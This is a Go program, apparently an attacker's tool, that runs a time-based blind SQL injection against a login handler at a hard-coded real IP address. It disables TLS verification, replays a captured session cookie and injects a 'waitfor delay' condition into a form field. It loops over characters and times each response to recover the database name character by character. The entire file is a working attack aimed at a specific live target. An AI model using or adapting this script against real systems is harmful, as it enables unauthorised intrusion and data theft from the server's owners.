package main

import (
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
)

func main() {
	var payloads = [...]string{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "-", "_", "=", "+"}
	for _, value := range payloads {
		Httpget(value)
		//fmt.Println(value)
	}

	//for i := 0; i < 76; i++ {
	//	Httpget(i)
	//}
}
func Httpget(payload string) {
	//i := strconv.Itoa(payload)
	url := "https://117.145.188.82:8010/LoginHandler.ashx"
	cli := &http.Client{Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	time_start := time.Now()
	request, err := http.NewRequest("POST", url, strings.NewReader(`Method=GetSystemConfig&class.module.classLoader.URLs[a0]=&key=w') IF((select db_name()) like 'ticketmanager_mgc`+payload+`%') waitfor delay'0:0:3'/**/--/**/`))

	if err != nil {
		fmt.Println(err)
	}

	request.Header.Add("Host", "117.145.188.82:8010")
	request.Header.Add("Cookie", "ASP.NET_SessionId=uuigwbm4v4b30ykuja5c2xsn")
	request.Header.Add("Content-Length", "134")
	request.Header.Add("Accept", "application/json, text/javascript, */*; q=0.01")
	request.Header.Add("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
	request.Header.Add("X-Requested-With", "XMLHttpRequest")
	request.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36")
	request.Header.Add("Origin", "https://117.145.188.82:8010")
	request.Header.Add("Sec-Fetch-Site", "same-origin")
	request.Header.Add("Sec-Fetch-Mode", "cors")
	request.Header.Add("Sec-Fetch-Dest", "empty")
	request.Header.Add("Referer", "https://117.145.188.82:8010/")
	request.Header.Add("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")

	do, err := cli.Do(request)
	if err != nil {
		fmt.Println(err)
	}
	defer func() {
		_ = do.Body.Close()
	}()
	all, _ := ioutil.ReadAll(do.Body)
	html := string(all)
	if do.StatusCode == 200 && strings.Contains(html, "Message") {
		fmt.Print(payload + ": 用时")
		fmt.Println(time.Since(time_start))
	}
	//                   fmt.Println(html)
}
